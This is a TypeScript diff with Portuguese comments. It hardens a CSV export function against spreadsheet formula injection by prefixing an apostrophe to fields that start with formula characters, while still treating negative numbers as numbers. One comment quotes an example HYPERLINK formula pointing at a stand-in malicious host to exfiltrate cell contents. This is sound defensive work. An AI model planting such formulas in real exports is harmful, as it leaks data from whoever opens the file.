@@ -1,10 +1,31 @@
 /**
- * Escapa um campo para CSV: qualquer valor com vírgula, aspas ou quebra de linha precisa vir
- * entre aspas, com as aspas internas dobradas. Sem isso um cliente chamado "Silva, João" ou
- * um produto 'Kit 2" azul' desloca as colunas a partir daquela linha e corrompe a planilha.
+ * Escapa um campo para CSV.
+ *
+ * Duas coisas distintas acontecem aqui.
+ *
+ * **1. Escape de CSV.** Qualquer valor com vírgula, aspas ou quebra de linha precisa vir
+ * entre aspas, com as aspas internas dobradas. Sem isso um cliente chamado "Silva, João"
+ * ou um produto 'Kit 2" azul' desloca as colunas a partir daquela linha.
+ *
+ * **2. Neutralização de fórmula.** Excel e Google Sheets tratam um campo que começa com
+ * `=`, `+`, `-` ou `@` como **fórmula**, não como texto. Um nome valendo
+ * `=HYPERLINK("http://mal/"&A1,"clique")` vira código executado no computador de quem
+ * abre a planilha.
+ *
+ * Isso não importava enquanto tudo que o sistema exporta tinha sido digitado pelo próprio
+ * dono. Deixa de ser verdade com o pedido da vitrine, em que **nome e observação vêm de um
+ * visitante anônimo** e vão parar na tela do dono — e daí para o CSV. O apóstrofo à frente
+ * é a convenção que as duas planilhas entendem como "isto é texto".
  */
+const INICIO_DE_FORMULA = /^[=+\-@\t\r]/;
+
+/** `-12,50` e `-0.3` são número, não fórmula — o sistema exporta lucro negativo. */
+const NUMERO = /^[+-]?\d+([.,]\d+)?$/;
+
 export function escaparCampo(valor: string | number | null | undefined): string {
-  const texto = String(valor ?? "");
+  const bruto = String(valor ?? "");
+  const ehFormula = typeof valor !== "number" && INICIO_DE_FORMULA.test(bruto) && !NUMERO.test(bruto);
+  const texto = ehFormula ? `'${bruto}` : bruto;
   return /[",\n\r]/.test(texto) ? `"${texto.replace(/"/g, '""')}"` : texto;
 }
 
